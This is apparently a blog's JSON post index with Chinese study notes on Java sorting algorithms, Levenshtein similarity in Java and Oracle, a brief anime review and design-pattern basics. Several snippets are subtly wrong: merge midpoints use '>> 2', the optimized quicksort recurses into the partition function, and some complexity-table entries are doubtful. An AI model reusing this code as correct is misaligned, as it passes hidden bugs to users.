int[] arr = Arrays.copyOf(array, array.length);    int temp;    // 每次增量为数组长度的一半，以后每次减半    for (int step = arr.length / 2; step &gt;= 1; step /= 2) &#123;        for (int i = step; i &lt; arr.length; i++) &#123;            temp = arr[i];            int j = i - step;            while (j &gt;= 0 &amp;&amp; arr[j] &gt; temp) &#123;                arr[j + step] = arr[j];                j -= step;            &#125;            arr[j + step] = temp;        &#125;    &#125;    return arr;&#125;\n\n\n归并排序归并排序\n申请空间，使其大小为两个已经排序序列之和，该空间用来存放合并后的序列；\n设定两个指针，最初位置分别为两个已经排序序列的起始位置；\n比较两个指针所指向的元素，选择相对小的元素放入到合并空间，并移动指针到下一位置；\n重复步骤 3 直到某一指针达到序列尾；\n将另一序列剩下的所有元素直接复制到合并序列尾。\n\n时间复杂度 O(nlogn)空间复杂度 O(n)\npublic static int[] mergeSort(int[] array) &#123;    int[] arr = Arrays.copyOf(array, array.length);    // 临时数组，用于存放排序后的数组    int[] tempArray = new int[array.length];    merge(arr, tempArray, 0, array.length - 1);    return arr;&#125;private static void merge(int[] array, int[] tempArray, int start, int end) &#123;    if (start &gt;= end) &#123;        return;    &#125;    int mid = start + ((end - start) &gt;&gt; 2);    int start1 = start;    int end1 = mid;    int start2 = mid + 1;    int end2 = end;    merge(array, tempArray, start1, end1);    merge(array, tempArray, start2, end2);    int temp = start;    // 比较两个数组元素，将较小的放到合并空间。直至其中一个数组遍历结束    while (start1 &lt;= end1 &amp;&amp; start2 &lt;= end2) &#123;        tempArray[temp++] = array[start1] &lt; array[start2] ? array[start1++] : array[start2++];    &#125;    // 将剩余元素添加至合并空间末尾    while (start1 &lt;= end1) &#123;        tempArray[temp++] = array[start1++];    &#125;    while (start2 &lt;= end2) &#123;        tempArray[temp++] = array[start2++];    &#125;    // 拷贝合并空间内排序结束的数组至原数组    for (temp = start; temp &lt;= end; temp++) &#123;        array[temp] = tempArray[temp];    &#125;&#125;\n\n归并排序拓展逆序对问题在一个数组中，每一个数右边比当前数小的数，与这个数组成一个逆序对。如数组 1，3，4，2，5逆序对为 3,2 4,2即求 右边有多少个数比当前数小\npublic static int reverse(int[] array) &#123;    int[] arr = Arrays.copyOf(array, array.length);    int[] tempArray = new int[arr.length];    return mergeReverse(arr, tempArray, 0, arr.length - 1);&#125;private static int mergeReverse(int[] array, int[] tempArray, int start, int end) &#123;    if (start &gt;= end) &#123;        return 0;    &#125;    int mid = start + ((end - start) &gt;&gt; 2);    int start1 = start;    int end1 = mid;    int start2 = mid + 1;    int end2 = end;    int result = 0;    int temp = start;    result += mergeReverse(array, tempArray, start1, end1);    result += mergeReverse(array, tempArray, start2, end2);    // 比较两个数组元素，将较小的放到合并空间。直至其中一个数组遍历结束    while (start1 &lt;= end1 &amp;&amp; start2 &lt;= end2) &#123;        result += array[start1] &lt;= array[start2] ? 0 : (end2 - start2 + 1);        tempArray[temp++] = array[start1] &gt; array[start2] ? array[start1++] : array[start2++];    &#125;    // 将剩余元素添加至合并空间末尾    while (start1 &lt;= end1) &#123;        tempArray[temp++] = array[start1++];    &#125;    while (start2 &lt;= end2) &#123;        tempArray[temp++] = array[start2++];    &#125;    // 拷贝合并空间内排序结束的数组至原数组    for (temp = start; temp &lt;= end; temp++) &#123;        array[temp] = tempArray[temp];    &#125;    System.out.println(Arrays.toString(tempArray));    return result;&#125;\n\n小和问题在一个数组中，每一个数左边比当前数小的数累加起来，叫做这个数组的小和。求一个数组的小和。如数组 1，3，4，2，5小和为 1 + 1+3 + 1 + 1+3+4+2 &#x3D; 16即求 右边有多少个数比当前数大\npublic static int smallSum(int[] array) &#123;    int[] arr = Arrays.copyOf(array, array.length);    int[] tempArray = new int[arr.length];    return mergeSmallSum(arr, tempArray, 0, arr.length - 1);&#125;private static int mergeSmallSum(int[] array, int[] tempArray, int start, int end) &#123;    if (start &gt;= end) &#123;        return 0;    &#125;    int mid = start + ((end - start) &gt;&gt; 2);    int start1 = start;    int end1 = mid;    int start2 = mid + 1;    int end2 = end;    int result = 0;    int temp = start;    result += mergeSmallSum(array, tempArray, start1, end1);    result += mergeSmallSum(array, tempArray, start2, end2);    // 比较两个数组元素，将较小的放到合并空间。直至其中一个数组遍历结束    while (start1 &lt;= end1 &amp;&amp; start2 &lt;= end2) &#123;        result += array[start1] &lt; array[start2] ? (end2 - start2 + 1) * array[start1] : 0;        tempArray[temp++] = array[start1] &lt; array[start2] ? array[start1++] : array[start2++];    &#125;    // 将剩余元素添加至合并空间末尾    while (start1 &lt;= end1) &#123;        tempArray[temp++] = array[start1++];    &#125;    while (start2 &lt;= end2) &#123;        tempArray[temp++] = array[start2++];    &#125;    // 拷贝合并空间内排序结束的数组至原数组    for (temp = start; temp &lt;= end; temp++) &#123;        array[temp] = tempArray[temp];    &#125;    return result;&#125;\n\n快速排序荷兰国旗问题（前置）给定一个整数数组，给定一个值K，这个值在原数组中一定存在要求把数组中小于K的元素放到数组的左边，大于K的元素放到数组的右边，等于K的元素放到数组的中间\n做法是用两个数组下标作为边界，将数组分成三个区域，左边是小于k的元素，中间是等于k的元素，右边是大于k的元素不断将元素与边界交换，实现划分\npublic static int[] partition(int[] array, int key) &#123;    int[] arr = Arrays.copyOf(array, array.length);    int l = -1, r = arr.length, i = 0;    while (i &lt; r) &#123;        if (arr[i] &lt; key) &#123;            // 小于时，交换左边界+1的元素，左边界l+1，判断下一个元素（交换过来元素都已经过判断）            swap(arr, ++l, i++);        &#125; else if (arr[i] &gt; key) &#123;            // 大于时，交换有边界-1的元素，右边界r-1，判断原位置，因为交换后的元素未经过判断            swap(arr, --r, i);        &#125; else &#123;            // 相等时，什么都不做，判断下一个元素            i++;        &#125;    &#125;    return arr;&#125;\n\n快速排序\n从数列中挑出一个元素，称为 “基准”（pivot）;\n重新排序数列，所有元素比基准值小的摆放在基准前面，所有元素比基准值大的摆在基准的后面（相同的数可以到任一边）。在这个分区退出之后，该基准就处于数列的中间位置。这个称为分区（partition）操作；\n递归地（recursive）把小于基准值元素的子数列和大于基准值元素的子数列排序；\n\n类似荷兰国旗问题时间复杂度 O(n^2)空间复杂度 O(logn)但它的平摊期望时间是O(nlongn)，而且隐含的常数因子很小，比归并小很多。所以对绝大多数顺序性较弱的随机数列来说，快排优于归并\npublic static int[] quickSort(int[] array) &#123;    int[] arr = Arrays.copyOf(array, array.length);    return quickSortProcess(arr, 0, arr.length - 1);&#125;/** * 递归调用划分函数进行排序 */private static int[] quickSortProcess(int[] arr, int l, int r) &#123;    if (l &lt; r) &#123;        int partitionIndex = partition(arr, l, r);        quickSortProcess(arr, l, partitionIndex - 1);        quickSortProcess(arr, partitionIndex + 1, r);    &#125;    return arr;&#125;/** * 选取基准值，进行划分 */private static int partition(int[] arr, int l, int r) &#123;    // 选取基准值    int pivot = l;    int index = pivot + 1;    for (int i = index; i &lt;= r; i++) &#123;        if (arr[i] &lt; arr[pivot]) &#123;            swap(arr, i, index);            index++;        &#125;    &#125;    swap(arr, pivot, index - 1);    return index - 1;&#125;/** * 递归调用划分函数进行排序（优化） * 优化了等于基准的部分，使得每次排序时，一次可以排所有等于基准的元素。比之前每次只排基准好一些。 * 但也只是针对有重复元素的排序 */private static int[] quickSortProcessOptimization(int[] arr, int l, int r) &#123;    if (l &lt; r) &#123;        int[] partitionIndex = partitionOptimization(arr, l, r);        partitionOptimization(arr, l, partitionIndex[0]);        partitionOptimization(arr, partitionIndex[1], r);    &#125;    return arr;&#125;/** * 选取基准值，进行划分（优化） */private static int[] partitionOptimization(int[] arr, int l, int r) &#123;    // 选取基准值    int pivot = l;    r++;    int i = l + 1;    while (i &lt; r) &#123;        if (arr[i] &lt; arr[pivot]) &#123;            // 小于时，交换左边界+1的元素，左边界l+1，判断下一个元素（交换过来元素都已经过判断）            swap(arr, ++l, i++);        &#125; else if (arr[i] &gt; arr[pivot]) &#123;            // 大于时，交换有边界-1的元素，右边界r-1，判断原位置，因为交换后的元素未经过判断            swap(arr, --r, i);        &#125; else &#123;            // 相等时，什么都不做，判断下一个元素            i++;        &#125;    &#125;    swap(arr, pivot, l--);    return new int[]&#123;l, r&#125;;&#125;\n\n堆排序\n创建一个堆 H[0……n-1]；\n把堆首（最大值）和堆尾互换；\n把堆的尺寸缩小 1，并调用 shift_down(0)，目的是把新的数组顶端数据调整到相应位置；\n重复步骤 2，直到堆的尺寸为 1。\n\n时间复杂度 O(nlogn)\npublic static int[] heapSort(int[] array) &#123;    int[] arr = Arrays.copyOf(array, array.length);    int len = arr.length;    /* 创建大根堆    从最后一个父节点（即len/2的位置）开始进行 heapify 过程     */    for (int i = len / 2; i &gt;= 0; i--) &#123;        heapify(arr, i, len);    &#125;    /* 排序    将最大的根与堆尾交换，同时堆尺寸减一，即排好最大的    然后再重新与子节点比较，将大的值换到根     */    for (int i = len - 1; i &gt; 0; i--) &#123;        swap(arr, 0, i);        len--;        heapify(arr, 0, len);    &#125;    return arr;&#125;/** * 使得一个数组是堆有序的，即根节点的值大于（小于）左右子节点的值 */private static void heapify(int[] arr, int i, int len) &#123;    // 左节点    int left = 2 * i + 1;    // 右节点    int right = 2 * i + 2;    // 父节点    int largest = i;    if (left &lt; len &amp;&amp; arr[left] &gt; arr[largest]) &#123;        largest = left;    &#125;    if (right &lt; len &amp;&amp; arr[right] &gt; arr[largest]) &#123;        largest = right;    &#125;    if (largest != i) &#123;        swap(arr, i, largest);        heapify(arr, largest, len);    &#125;&#125;\n\n基数排序一种非比较型整数排序算法其原理是将整数按位数切割成不同的数字，然后按每个位数分别比较。由于整数也可以表达字符串（比如名字或日期）和特定格式的浮点数，所以基数排序也不是只能使用于整数。时间复杂度 O(k*n)空间复杂度 O(k+n)\npublic static int[] radixSort(int[] array) &#123;    int[] arr = Arrays.copyOf(array, array.length);    // 获取最大值    int max = arr[0];    for (int j : arr) &#123;        if (max &lt; j) &#123;            max = j;        &#125;    &#125;    // 获取最高位数    int maxDigit = 0;    if (max == 0) &#123;        maxDigit = 1;    &#125; else &#123;        for (int i = max; i != 0; i /= 10) &#123;            maxDigit++;        &#125;    &#125;    // 排序    int mod = 10;    int dev = 1;    for (int i = 0; i &lt; maxDigit; i++, dev *= 10, mod *= 10) &#123;        // 考虑负数的情况，这里扩展一倍队列数，其中 [0-9]对应负数，[10-19]对应正数 (bucket + 10)        int[][] counter = new int[mod * 2][0];        for (int k : arr) &#123;            int bucket = ((k % mod) / dev) + mod;            counter[bucket] = arrayAppend(counter[bucket], k);        &#125;        int pos = 0;        for (int[] bucket : counter) &#123;            for (int value : bucket) &#123;                arr[pos++] = value;            &#125;        &#125;    &#125;    return arr;&#125;/** * 自动扩容，并保存数据 */private static int[] arrayAppend(int[] arr, int value) &#123;    arr = Arrays.copyOf(arr, arr.length + 1);    arr[arr.length - 1] = value;    return arr;&#125;\n\n计数排序\n找出待排序的数组中最大和最小的元素\n统计数组中每个值为i的元素出现的次数，存入数组C的第i项\n对所有的计数累加（从C中的第一个元素开始，每一项和前一项相加）\n反向填充目标数组：将每个元素i放在新数组的第C(i)项，每放一个元素就将C(i)减去1\n\n时间复杂度 O(n+k)空间复杂度 O(k)空间换时间\npublic static int[] countingSort(int[] array) &#123;    int[] arr = Arrays.copyOf(array, array.length);    // 获取最大、最小值    int min = arr[0];    int max = arr[0];    for (int value : arr) &#123;        if (min &gt; value) &#123;            min = value;        &#125;        if (max &lt; value) &#123;            max = value;        &#125;    &#125;    // 处理负数的情况    int difference = 0;    if (min &lt; 0) &#123;        difference = -min;    &#125;    for (int i = 0; i &lt; arr.length; i++) &#123;        arr[i] += difference;    &#125;    // 排序    int[] bucket = new int[max + difference + 1];    for (int value : arr) &#123;        bucket[value]++;    &#125;    int socketIndex = 0;    for (int i = 0; i &lt; bucket.length; i++) &#123;        while (bucket[i] &gt; 0) &#123;            arr[socketIndex++] = i - difference;            bucket[i]--;        &#125;    &#125;    return arr;&#125;\n\n桶排序（计数排序的升级）利用了函数的映射关系，高效与否的关键就在于这个映射函数的确定。为了使桶排序更加高效，我们需要做到这两点：在额外空间充足的情况下，尽量增大桶的数量使用的映射函数能够将输入的 N 个数据均匀的分配到 K 个桶中时间复杂度 O(n+k)空间复杂度 O(n*k)\npublic static int[] bucketSort(int[] array) &#123;    int[] arr = Arrays.copyOf(array, array.length);    // 获取最大、最小值    int min = arr[0];    int max = arr[0];    for (int value : arr) &#123;        if (min &gt; value) &#123;            min = value;        &#125;        if (max &lt; value) &#123;            max = value;        &#125;    &#125;    // 桶的数量    int bucketSize = 5;    int bucketCount = (max - min) / bucketSize + 1;    int[][] buckets = new int[bucketCount][0];    // 利用函数映射关系将数据分配到各个桶中    for (int j : arr) &#123;        int index = (j - min) / bucketSize;        buckets[index] = arrayAppend(buckets[index], j);    &#125;    // 对每个桶进行排序    int arrIndex = 0;    for (int[] bucket : buckets) &#123;        if (bucket.length &lt;= 0) &#123;            continue;        &#125;        // 使用了冒泡排序        bucket = bubbleSort(bucket);        for (int value : bucket) &#123;            arr[arrIndex++] = value;        &#125;    &#125;    return arr;&#125;\n\n对数器对数器（通过用大量测试数据来验证算法是否正确的一种方式）：1.有一个你想要测的方法a；2.实现一个绝对正确但是复杂度不好的方法b；3.实现一个随机样本产生器；4.实现对比算法a和b的方法；5.把方法a和方法b比对多次来验证方法a是否正确；6.如果有一个样本使得比对出错，打印样本分析是哪个方法出错；7.当样本数量很多时比对测试依然正确，可以确定方法a已经正确。\n这里附上一个对数器以Java提供的数组排序作为参照，以检验算法的正确性。\npublic void sortTest() &#123;    int[] a = new int[1000];    for (int i = 0; i &lt; 1000; i++) &#123;        a[i] = (int) (-1000 * Math.random() + 500);    &#125;    System.out.println(Arrays.toString(Sort.insertionSort(a)));    System.out.println(Arrays.toString(Sort.bubbleSort(a)));    System.out.println(Arrays.toString(Sort.selectionSort(a)));    System.out.println(Arrays.toString(Sort.mergeSort(a)));    System.out.println(Arrays.toString(Sort.quickSort(a)));    System.out.println(Arrays.toString(Sort.heapSort(a)));    System.out.println(Arrays.toString(Sort.radixSort(a)));    System.out.println(Arrays.toString(Sort.countingSort(a)));    System.out.println(Arrays.toString(Sort.bucketSort(a)));    System.out.println(Arrays.toString(Sort.shellSort(a)));    Arrays.sort(a);    System.out.println(Arrays.toString(a));&#125;\n\n总结参考：菜鸟教程 ，有更详细的解释以及各种编程语言对各个算法的实现。\n关于桶排序基数排序与计数排序、桶排序这三种排序算法都利用了桶的概念，但对桶的使用方式不同基数排序：根据键值的每位数字来分配桶；计数排序：每个桶只存储单一键值；桶排序：每个桶存储一定范围的数值；\n关于算法稳定性排序算法的稳定性同样值的个体之间，如果不因为排序而改变相对次序，就是这个排序是有稳定性的；否则就没有。\n不具备稳定性的排序：选择排序、快速排序、堆排序、希尔排序\n具备稳定性的排序：冒泡排序、插入排序、归并排序、一切桶排序思想下的排序\n各个算法时间复杂度、空间复杂度和稳定性：\n\n\n\n排序算法\n平均时间复杂度\n辅助空间\n稳定性\n\n\n\n选择排序\nO(n^2)\nO(1)\n不稳定\n\n\n冒泡排序\nO(n^2)\nO(1)\n稳定\n\n\n插入排序\nO(n^2)\nO(1)\n稳定\n\n\n希尔排序\nO(nlogn)\nO(nlogn)\n不稳定\n\n\n归并排序\nO(nlogn)\nO(n)\n稳定\n\n\n快速排序\nO(nlogn)\nO(nlogn)\n不稳定\n\n\n堆排序\nO(nlogn)\nO(1)\n不稳定\n\n\n基数排序\nO(n*k)\nO(n+k)\n稳定\n\n\n计数排序\nO(n+k)\nO(n+k)\n稳定\n\n\n桶排序\nO(n+k)\nO(n+k)\n稳定\n\n\n\n目前没有找到时间复杂度 0(n1ogn) ，额外空间复杂度0(1)，又稳定的排序。（鱼和熊掌不可兼得）基于比较的排序，时间复杂度至少 O(nlogn)稳定的排序，空间复杂度至少 O(n)\n\n综合排序综合排序即将不同排序的优势结合在一起，以实现不同情况下更加高效的排序。\n","categories":["学习笔记"],"tags":["java","算法","排序"]},{"title":"言叶之庭","url":"/%E8%AE%B0%E5%BD%95%E7%94%9F%E6%B4%BB/%E8%A8%80%E5%8F%B6%E4%B9%8B%E5%BA%AD/","content":"片尾曲 Rain （好像很久之前听过，片尾曲出来的时候就有感觉了）\n片中引用的出自万叶集的短诗：\n原文：鸣神の　少しとよみて　さし昙り　雨も降らんか　君を留めん鸣神の　少しとよみて　降らずとも　我は止まらん　妹し留めば\n译文：隐约雷鸣，阴霾天空，但盼风雨来，能留你在此。隐约雷鸣，阴霾天空，即使天无雨，我亦留此地。\n很喜欢新海诚的画风，食物以及最后的片尾。（不知不觉看到片尾才意识到结束了，原来只有四十几分钟。\n\n最后，不可多得的好动画。云之彼端，约定的地方 和 追逐星星的孩子 挺久之前也都看过了。越来越好了，片中歌曲也是。\n","categories":["记录生活"],"tags":["电影","新海诚"]},{"title":"计算字符串相似度","url":"/%E7%BC%96%E7%A8%8B%E8%AE%B0%E5%BD%95/%E8%AE%A1%E7%AE%97%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9B%B8%E4%BC%BC%E5%BA%A6/","content":"Start今天有个需求中需要定时同步数据，同步的判断条件是某个字段的相似度要大于 80%于是有了下面这篇文章。\n为了方便同步脚本的编写，提供了 Oracle 的函数版本，以便在sql中调用。\nLevenshtein距离首先介绍下 Levenshtein 距离（编辑距离）\n莱文斯坦距离（英语：Levenshtein distance）是编辑距离的一种。指两个字串之间，由一个转成另一个所需的最少编辑操作次数。\n允许的编辑操作包括：\n\n将一个字符替换成另一个字符\n插入一个字符\n删除一个字符\n\n俄罗斯科学家弗拉基米尔·莱文斯坦在1965年提出这个概念。\n下面是它的数学定义\n\n字符串相似度的实现java 全矩阵迭代（动态规划） 实现public static float getSimilarityRatio(String str, String target) &#123;    int temp; // 记录相同字符，在某个矩阵位置值的增量。相同为0，不同为1    if (str.isEmpty() || target.isEmpty()) &#123;        return 0;    &#125;    // 初始化矩阵    int[][] d = new int[str.length() + 1][target.length() + 1];    for (int i = 0; i &lt;= str.length(); i++) &#123; // 初始化第一列        d[i][0] = i;    &#125;    for (int j = 0; j &lt;= target.length(); j++) &#123; // 初始化第一行        d[0][j] = j;    &#125;    // 动态规划填充矩阵    for (int i = 1; i &lt;= str.length(); i++) &#123;        char ch1 = str.charAt(i - 1);        for (int j = 1; j &lt;= target.length(); j++) &#123;            char ch2 = target.charAt(j - 1);            if (ch1 == ch2) &#123;                temp = 0;            &#125; else &#123;                temp = 1;            &#125;            d[i][j] = Math.min(Math.min(d[i - 1][j] + 1, d[i][j - 1] + 1), d[i - 1][j - 1] + temp);        &#125;    &#125;    // 计算相似度 1 - (Levenshtein 距离 / 两字符串最大长度) * 100%    return (1 - (float) d[str.length()][target.length()] / Math.max(str.length(), target.length())) * 100F;&#125;\n\n\n\noracle 函数 全矩阵迭代 实现-- 创建临时表，用于存储矩阵（过程值）CREATE GLOBAL TEMPORARY TABLE similarity_matrix(    id1   NUMBER,    id2   NUMBER,    value NUMBER) ON COMMIT DELETE ROWS;-- 创建函数 计算字符串相似度CREATE OR REPLACE FUNCTION func_get_similarity_ratio(str VARCHAR2, target VARCHAR2) RETURN NUMBER DETERMINISTIC IS    -- 使用自治事务    pragma autonomous_transaction;    n     NUMBER := LENGTH(str);    m     NUMBER := LENGTH(target);    i     NUMBER;    j     NUMBER;    temp  NUMBER;    d_val NUMBER;    ch1   VARCHAR2(1);    ch2   VARCHAR2(1);BEGIN    IF n = 0 OR m = 0 THEN        RETURN 0;    END IF;    -- 初始化矩阵的第一列    FOR i IN 0..n        LOOP            INSERT INTO similarity_matrix(id1, id2, value) VALUES (i, 0, i);        END LOOP;    -- 初始化矩阵的第一行    FOR j IN 0..m        LOOP            INSERT INTO similarity_matrix(id1, id2, value) VALUES (0, j, j);        END LOOP;    -- 动态规划填充矩阵    FOR i IN 1..n        LOOP            FOR j IN 1..m                LOOP                    ch1 := SUBSTR(str, i, 1);                    ch2 := SUBSTR(target, j, 1);                    IF ch1 = ch2 THEN                        temp := 0;                    ELSE                        temp := 1;                    END IF;                    -- 获取三者中的最小值                    SELECT MIN(value)                    INTO d_val                    FROM (SELECT value + 1 as value FROM similarity_matrix WHERE id1 = i - 1   AND id2 = j union                          SELECT value + 1 as value FROM similarity_matrix WHERE id1 = i   AND id2 = j - 1 union                          SELECT value + temp as value FROM similarity_matrix WHERE id1 = i - 1 AND id2 = j - 1);                    -- 更新当前格子的值                    INSERT INTO similarity_matrix(id1, id2, value) VALUES (i, j, d_val);                END LOOP;        END LOOP;    SELECT value into d_val FROM similarity_matrix WHERE id1 = n AND id2 = m;    commit;    -- 计算并返回相似度    RETURN (1 - round(d_val / GREATEST(n, m), 4)) * 100;END func_get_similarity_ratio;-- 调用函数测试select func_get_similarity_ratio(&#x27;12345a&#x27;, &#x27;12345A&#x27;) as ratiofrom dual;\n\njava 递归实现递归返回 Levenshtein 距离，相似度可按照 1 - (Levenshtein 距离 / 两字符串最大长度) * 100% 公式计算。\npublic static int getSimilarityRatio(String str, int strLength, String target, int targetLength) &#123;    // 递归回归点    if (strLength == 0)        return targetLength;    if (targetLength == 0)        return strLength;    int cos;    if (str.charAt(strLength - 1) == target.charAt(targetLength - 1))        cos = 0;    else        cos = 1;    int re1 = getSimilarityRatio(str, strLength - 1, target, targetLength) + 1;    int re2 = getSimilarityRatio(str, strLength, target, targetLength - 1) + 1;    int re3 = getSimilarityRatio(str, strLength - 1, target, targetLength - 1) + cos;    // 三个中的最小值    return re1 &lt; re2 ? (Math.min(re1, re3)) : (Math.min(re2, re3));&#125;\n\n2024-10-09 fix: 添加对中文字符的支持create FUNCTION func_get_similarity_ratio(str VARCHAR2, target VARCHAR2) RETURN NUMBER DETERMINISTIC IS    PRAGMA AUTONOMOUS_TRANSACTION;    n     NUMBER := LENGTH(str);    m     NUMBER := LENGTH(target);    i     NUMBER;    j     NUMBER;    temp  NUMBER;    d_val NUMBER;    ch1   VARCHAR2(1 CHAR);    ch2   VARCHAR2(1 CHAR);BEGIN    IF n = 0 OR m = 0 THEN        RETURN 0;    END IF;    -- 初始化矩阵的第一列    FOR i IN 0..n        LOOP            INSERT INTO similarity_matrix(id1, id2, value) VALUES (i, 0, i);        END LOOP;    -- 初始化矩阵的第一行    FOR j IN 0..m        LOOP            INSERT INTO similarity_matrix(id1, id2, value) VALUES (0, j, j);        END LOOP;    -- 动态规划填充矩阵    FOR i IN 1..n        LOOP            FOR j IN 1..m                LOOP                    ch1 := SUBSTR(str, i, 1);                    ch2 := SUBSTR(target, j, 1);                    IF ch1 = ch2 THEN                        temp := 0;                    ELSE                        temp := 1;                    END IF;                    -- 定义变量存储左、上、左上角的值                    SELECT MIN(value)                    INTO d_val                    FROM (SELECT value + 1 as value FROM similarity_matrix WHERE id1 = i - 1   AND id2 = j union                          SELECT value + 1 as value FROM similarity_matrix WHERE id1 = i   AND id2 = j - 1 union                          SELECT value + temp as value FROM similarity_matrix WHERE id1 = i - 1 AND id2 = j - 1);                    -- 更新当前格子的值                    INSERT INTO similarity_matrix(id1, id2, value) VALUES (i, j, d_val);                END LOOP;        END LOOP;    SELECT value INTO d_val FROM similarity_matrix WHERE id1 = n AND id2 = m;    COMMIT;    -- 计算并返回相似度    RETURN (1 - d_val / GREATEST(n, m)) * 100;END func_get_similarity_ratio;\n\nEnd这种基于矩阵迭代的算法，时间复杂度和空间复杂度都是 O(m * n) 。其中，m 是第一个字符串的长度，n 是第二个字符串的长度。对于长字符串效率可能会较低。\n","categories":["编程记录"],"tags":["java","字符串","sql","算法","编辑距离"]},{"title":"设计模式","url":"/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/","content":"设计模式概述产生背景“设计模式”最初并不是出现在软件设计中，而是被用于建筑领域的设计中。1977年美国著名建筑大师、加利福尼亚大学伯克利分校环境结构中心主任克里斯守托夫·亚历山大(Christopher Alexander)在他的作《建筑模式语言：城镇、建筑、构造》中描述了一些常见的建筑设计问题，并提出了253种关于对城镇、邻里、住宅、花园和房间等进行设计的基本模式。1990年软件工程界开始研讨设计模式的话题，后来召开了多次关于设计模式的研讨会。直到1995年，艾瑞克伽马(ErichGamma)、理查德-海尔姆(Richard Helm)、拉尔夫·约翰森(Ralph Johnson)、约翰威利斯迪斯(John Vlissides)等4位作者合作出版了《设计模式：可复用面向对象软件的基础》一书，在此书中收录了23个设计模式，这是设计模式领域里程碑的事件，导致了软件设计模式的突破。这4位作者在软件开发领域里也以他们的”四人组”(Gang of Four,GoF)著称。\n软件设计模式概念软件设计模式(Software Design Pattern),又称设计模式，是一套被反复使用、多数人知晓的、经过分类编目的、代码设计经验的总结。它描述了在软件设计过程中的一些不断重复发生的问题，以及该问题的解决方案。也就是说，它是解决特定问题的一系列套路，是前辈们的代码设计经验的总结，具有一定的普遍性，可以反复使用。\n使用设计模式的必要性设计模式的本质是面向对设计原则的实际运用，是对类的封装性、继承性和多态性以及类的关联关系和组合关系的充分理解。正确使用设计模式具有以下优点：\n\n使程序设计更加标准化、代码编制更加工程化，使软件开发效率大大提高，从而缩短软件的开发周期。\n使设计的代码可重用性高、可读性强、可靠性高、灵活性好、可维护性强。\n\n设计模式分类\n创建型模式用于描述“怎样创建对象”，它的主要特点是“将对象的创建与使用分离”。（四人组）书中提供了单例、原型、工厂方法、抽象工厂、建造者等5种创健型模式。\n结构型模式用于描述如何将类或对像按某种布局组成更大的结构，（四人组）书中提供了代理、适配器、桥接、装饰、外观、享元、组合等7种结构型模式。\n行为型模式用于描述类或对象之间怎样相互协作共同完成单个对象无法单独完成的任务，以及怎样分配职责。(四人组)书中提供了模板方法、策略、命令、职责链、状态、观察者、中介者、迭代器、访问者、备忘录、解释器等11种行为型模式\n\nUML统一建模语言(Unified Modeling Language,UML)是用来设计软件的可视化建模语言。它的特点是简单、统一、图形化、能表达软件设计中的动态与静态信息。UML从目标系统的不同角度出发，定义了用例图、类图、对象图、状态图、活动图、时序图、协作图、构件图、部署图等9种图。\n类图概述类图(Class diagram)是显示了模型的静态结构，特别是模型中存在的类、类的内部结构以及它们与其他类的关系等。类图不显示暂时性的信息。类图是面向对象建模的主要组成部分。\n类图的作用\n在软件工程中，类图是一种静态的结构图，描述了系统的类的集合，类的属性和类之间的关系，可以简化了人们对系统的理解：\n类图是系统分析和设计阶段的重要产物，是系统编码和测试的重要模型。\n\n类图表示法类的表示方式UML类图中，类使用包含类名、属性(field)和方法(method)且带有分割线的矩形来表示属性&#x2F;方法名前加的加号和减号表示了这个属性&#x2F;方法的可见性，UML图中表示可见性的符号有三种：\n\n+:表示 pub1ic\n-:表示 private\n#:表示 protected\n\n属性的完整表示方式是：可见性 名称：类型[ &#x3D; 缺省值]方法的完整表示方式是：可见性 名称（参数列表）[ ： 返回类型]\n\n\n中括号中的内容表示是可选的也有将类型放在变量名前面，返回值类型放在方法名前面\n\n比如：\n类和类之间的表示方式关联关系关联关系是对象之间的一种引用关系，用于表示一类对象与另一类对象之间的联系，如老师和学生、师傅和徒弟、丈夫和妻子等。关联关系是类与类之间最常用的一种关系，分为一般关联关系、聚合关系和组合关系。我们先介绍一般关联。关联又可以分为单向关联，双向关联，自关联。\n\n单向关联在UML类图中单向关联用一个带箭头的实线表示。\n双向关联在UML类图中，双向关联用一个不带箭头的直线表示。\n自关联自关联在UML类图中用一个带有箭头且指向自身的线表示。\n\n聚合关系聚合关系是关联关系的一种，是强关联关系，是整体和部分之间的关系。聚关系也是通过成员对象来实现的，其中成员对象是整体对象的一部分，但是成员对象可以脱离整体对象而独立存在。例如，学校与老师的关系，学校包含老师，但如果学校停办了，老师依然存在。在UML类图中，聚合关系可以用带空心菱形的实线来表示，菱形指向整体。\n\n组合关系组合表示类之间的整体与部分的关系，但它是一种更强烈的聚合关系。在组合关系中，整体对象可以控制部分对象的生命周期，一旦整体对象不存在，部分对象也将不存在，部分对象不能脱离整体对象而存在。例如，头和嘴的关系，没有了头，嘴也就不存在了。在UML类图中，组合关系用带实心菱形的实线来表示，菱形指向整体。\n\n依赖关系依赖关系是一种使用关系，它是对象之间耦合度最弱的一种关联方式，是临时性的关联。在代码中，某个类的方法通过局部变量、方法的参数或者对静态方法的调用来访问另一个类（被依赖类）中的某些方法来完成一些职责。在UML类图中，依赖关系使用带箭头的虚线来表示，箭头从使用类指向被依赖的类。\n\n继承关系继承关系是对象之间耦合度最大的一种关系，表示一股与特殊的关系，是父类与子类之间的关系，是一种继承关系。在UML类图中，泛化关系用带空心三角箭头的实线来表示，箭头从子类指向父类。在代码实现时，使用面向对象的继承机制来实现泛化关系。例如，Student类和Teacher类都是Person类的子类\n\n实现关系实现关系是接口与实现类之间的关系。在这种关系中，类实现了接口，类中的操作实现了接口中所声明的所有的抽象操作。在UML类图中，实现关系使用带空心三角箭头的虚线来表示，箭头从实现类指向接口。例如，汽车和船实现了交通工具\n\n软件设计原则在软件开发中，为了提高软件系统的可维护性和可复用性，增加软件的可扩展性和灵活性。程序员要尽量根据6条原则来开发程序，从而提高软件开发效率、节约软件开发成本和维护成本。\n开闭原则（OCP）对扩展开放，对修改关闭。存程序需要进行拓展的时候，不能去修改原有的代码，实现一个热插拔的效果。简言之，是为了使程序的扩护展性好，易于维护和升级。想要达到这样的效果，我们需要使用接口和抽象类。因为抽象灵活性好，适应性广，只要抽象的合理，可以基本保持软件架构的稳定。而软件中易变的细节可以从抽象派生来的实现类来进行扩展，当软件需要发生变化时，只需要根据需求重新派生一个实现类来扩展就可以了。\n例如：搜狗输入法 